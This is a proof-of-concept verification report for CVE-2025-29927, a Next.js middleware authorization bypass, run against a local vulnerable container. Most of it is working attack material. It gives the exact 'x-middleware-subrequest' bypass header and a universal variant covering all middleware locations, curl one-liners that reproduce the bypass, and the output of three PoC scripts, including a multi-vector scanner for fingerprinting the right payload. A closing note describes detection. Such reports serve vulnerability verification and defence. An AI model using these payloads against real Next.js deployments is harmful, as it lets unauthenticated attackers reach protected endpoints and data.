# PoC Verification Report: CVE-2025-29927

## Verification Status: ✅ CONFIRMED

CVE-2025-29927 (Next.js Middleware Authorization Bypass) is **confirmed exploitable** on Next.js 14.2.24. All three PoC scripts succeeded against the vulnerable container with 100% consistency.

---

## PoC Scripts

### Primary PoC: `poc.py`

| Field | Value |
|---|---|
| **Location** | `poc/poc.py` |
| **Language** | Python 3 (stdlib only — no external dependencies) |
| **Attack Vector** | Standard root middleware bypass (`middleware` x5) |
| **Usage** | `python3 poc.py [host] [port] [path]` |
| **Default Target** | `http://172.19.0.4:3000/api/protected` |

**Description**: Sends an unauthenticated baseline request (expecting 401), then sends the same request with the `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` header (expecting 200). Compares the two responses to confirm the middleware was bypassed.

### Vector 2: `poc_vector2.py` — Universal Bypass

| Field | Value |
|---|---|
| **Location** | `poc/poc_vector2.py` |
| **Language** | Python 3 (stdlib only) |
| **Attack Vector** | Universal payload covering all middleware locations |
| **Payload** | `middleware:middleware:middleware:middleware:middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:pages/_middleware` |

**Description**: Uses a single universal payload that covers ALL possible middleware file locations (root, `src/`, `pages/`). Useful when the middleware location is unknown. The recursion counter only counts exact matches, so extra entries for non-matching paths are harmless.

### Vector 3: `poc_vector3.py` — Multi-Vector Scanner

| Field | Value |
|---|---|
| **Location** | `poc/poc_vector3.py` |
| **Language** | Python 3 (stdlib only) |
| **Attack Vectors** | 8 vectors (3 bypass payloads, 5 edge case/negative tests) |

**Description**: Systematically tests ALL known bypass vectors and edge cases against the target. Tests standard root middleware (5x), src/ directory (5x), legacy pages middleware, partial payloads (below threshold), over-threshold payloads (7x), mixed-case header names, and empty header values. Reports which vectors succeed and whether each result matches expectations.

---

## Vulnerability Demonstrated

The PoC proves that an **unauthenticated attacker** can completely bypass Next.js middleware by including a single HTTP header in their request:

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

This causes Next.js to skip middleware execution entirely, bypassing any authentication, authorization, rate limiting, CSRF, or other security checks implemented in middleware.

**Root Cause**: The `x-middleware-subrequest` header is intended for internal use (tracking middleware recursion depth) but is never stripped from external incoming requests. When the header contains the middleware module name repeated ≥5 times (matching `MAX_RECURSION_DEPTH`), the middleware sandbox returns `x-middleware-next: 1`, telling Next.js to proceed without executing middleware.

---

## Test Results

### Test Environment

| Property | Value |
|---|---|
| Container | `cve-2025-29927-vulnerable` |
| Container IP | `localhost:3100` (host port mapping) |
| Next.js Version | 14.2.24 (vulnerable) |
| Middleware | Auth check requiring `Authorization: Bearer my-secret-token` |
| Protected Endpoint | `/api/protected` |

### poc.py — Primary PoC Output

```
======================================================================
 CVE-2025-29927 — Next.js Middleware Authorization Bypass PoC
======================================================================

  Target: http://172.19.0.4:3000/api/protected
  Bypass Header: x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

[Step 1] Baseline — Unauthenticated request (should be 401)
  [Baseline Response]
    HTTP Status: 401
    {
      "error": "Unauthorized"
    }

[Step 2] Exploit — Request with x-middleware-subrequest bypass header
  [Exploit Response]
    HTTP Status: 200
    {
      "message": "SUCCESS: You have accessed the protected API endpoint",
      "secret": "This data should only be visible to authenticated users",
      "flag": "CVE-2025-29927-middleware-bypass"
    }

[Step 3] Evaluation
  Baseline status: 401
  Exploit status:  200

======================================================================
  [VULNERABLE] CVE-2025-29927 CONFIRMED
  Middleware authorization was bypassed successfully.
  The x-middleware-subrequest header caused Next.js to skip middleware.

  Reproduction:
  curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://172.19.0.4:3000/api/protected
======================================================================
```

### poc_vector2.py — Universal Bypass Output

```
======================================================================
 CVE-2025-29927 — Vector 2: Universal Middleware Bypass
======================================================================

  Target: http://172.19.0.4:3000/api/protected
  Payload: x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:pages/_middleware
  Strategy: Single header covers root, src/, and pages/ middleware paths

[Step 1] Baseline request
  Status: 401

[Step 2] Universal bypass payload
  Status: 200
  Body: {
    "message": "SUCCESS: You have accessed the protected API endpoint",
    "secret": "This data should only be visible to authenticated users",
    "flag": "CVE-2025-29927-middleware-bypass"
  }

======================================================================
  [VULNERABLE] Universal bypass SUCCEEDED
======================================================================
```

### poc_vector3.py — Multi-Vector Scanner Output

```
======================================================================
 CVE-2025-29927 — Vector 3: Multi-Vector Scanner
======================================================================

  Target: http://172.19.0.4:3000/api/protected
  Vectors to test: 8

[Baseline] Unauthenticated request
  Status: 401

[Vector 1/8] Standard root middleware (5x)
  Description: Standard payload for root middleware.js (v13+)
  Status: 200 → ✓ BYPASS (expected)

[Vector 2/8] src/ directory middleware (5x)
  Description: Payload for src/middleware.js (v13+)
  Status: 401 → ✓ BLOCKED (expected)

[Vector 3/8] Legacy pages middleware (v11-12)
  Description: Payload for pages/_middleware.js (v11-12, no recursion check)
  Status: 401 → ✓ BLOCKED (expected)

[Vector 4/8] Partial payload (4x — below threshold)
  Description: Only 4 repetitions — depth=4 < MAX_RECURSION_DEPTH=5, should NOT bypass
  Status: 401 → ✓ BLOCKED (expected)

[Vector 5/8] Partial payload (1x)
  Description: Single middleware name — depth=1, should NOT bypass on v13+
  Status: 401 → ✓ BLOCKED (expected)

[Vector 6/8] Over-threshold (7x)
  Description: 7 repetitions — still >= 5, should bypass
  Status: 200 → ✓ BYPASS (expected)

[Vector 7/8] Mixed-case header name
  Description: HTTP headers are case-insensitive per RFC 7230
  Status: 200 → ✓ BYPASS (expected)

[Vector 8/8] Empty header value
  Description: Empty value — should have zero depth, no bypass
  Status: 401 → ✓ BLOCKED (expected)

======================================================================
 Summary
======================================================================
  ✓ Standard root middleware (5x): HTTP 200 → BYPASS
  ✓ src/ directory middleware (5x): HTTP 401 → BLOCKED
  ✓ Legacy pages middleware (v11-12): HTTP 401 → BLOCKED
  ✓ Partial payload (4x — below threshold): HTTP 401 → BLOCKED
  ✓ Partial payload (1x): HTTP 401 → BLOCKED
  ✓ Over-threshold (7x): HTTP 200 → BYPASS
  ✓ Mixed-case header name: HTTP 200 → BYPASS
  ✓ Empty header value: HTTP 401 → BLOCKED

  Bypass vectors found: 3/8
  Behavior matches expectations: 8/8

  [VULNERABLE] CVE-2025-29927 CONFIRMED
======================================================================
```

---

## Analysis of Vector Results

| Vector | HTTP Status | Bypassed | Expected | Correct |
|---|---|---|---|---|
| Standard root middleware (5x) | 200 | ✅ Yes | Yes | ✅ |
| src/ directory middleware (5x) | 401 | ❌ No | No | ✅ |
| Legacy pages middleware (v11-12) | 401 | ❌ No | No | ✅ |
| Partial payload (4x) | 401 | ❌ No | No | ✅ |
| Partial payload (1x) | 401 | ❌ No | No | ✅ |
| Over-threshold (7x) | 200 | ✅ Yes | Yes | ✅ |
| Mixed-case header name | 200 | ✅ Yes | Yes | ✅ |
| Empty header value | 401 | ❌ No | No | ✅ |

**All 8 vectors behaved exactly as expected (8/8 correct).**

### Key Observations

1. **Exact threshold**: The bypass requires exactly 5 or more repetitions. 4 repetitions (depth=4) does NOT bypass — confirming `MAX_RECURSION_DEPTH = 5` with `>=` comparison.
2. **Middleware name must match**: `src/middleware` and `pages/_middleware` payloads do NOT work against this lab (which uses root `middleware.js`) — confirming the recursion counter uses exact string matching against `params.name`.
3. **Header name is case-insensitive**: `X-Middleware-Subrequest` works the same as `x-middleware-subrequest` — consistent with HTTP/1.1 header case-insensitivity (RFC 7230).
4. **Over-threshold works**: 7 repetitions still triggers the bypass — the check is `depth >= MAX_RECURSION_DEPTH`, not `depth == MAX_RECURSION_DEPTH`.
5. **Empty value is safe**: An empty header value results in zero depth and does not bypass.
6. **Universal payload works**: The combined payload (vector 2) successfully bypasses because it contains 5x `middleware`, which matches the lab's middleware name.

---

## Reproduction Commands

### Minimal curl one-liner (standard bypass)
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://172.19.0.4:3000/api/protected
```

### Universal curl one-liner (covers all middleware locations)
```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:pages/_middleware" \
  http://172.19.0.4:3000/api/protected
```

### Python PoC
```bash
python3 poc/poc.py localhost 3100 /api/protected
```

---

## Notes

- **No external dependencies**: All three PoC scripts use only Python stdlib (`http.client`, `json`, `socket`, `sys`). No `pip install` required.
- **Trivial exploitation**: This is a single-header bypass — no complex session management, timing windows, race conditions, or multi-step flows. It is as simple as adding one HTTP header.
- **Pre-authentication**: No credentials, tokens, or sessions are needed. The entire point is bypassing authentication.
- **Version-specific payloads**: The exact header value depends on the middleware file location, which varies by project structure. The multi-vector scanner (poc_vector3.py) can fingerprint the correct payload.
- **Detection**: Defenders can detect exploitation attempts by monitoring for the `x-middleware-subrequest` header in incoming HTTP requests. Legitimate requests should NEVER contain this header from external sources.

---

## Files

| File | Path | Description |
|---|---|---|
| poc.py | `poc/poc.py` | Primary PoC — standard root middleware bypass |
| poc_vector2.py | `poc/poc_vector2.py` | Universal bypass covering all middleware locations |
| poc_vector3.py | `poc/poc_vector3.py` | Multi-vector scanner with edge case testing |
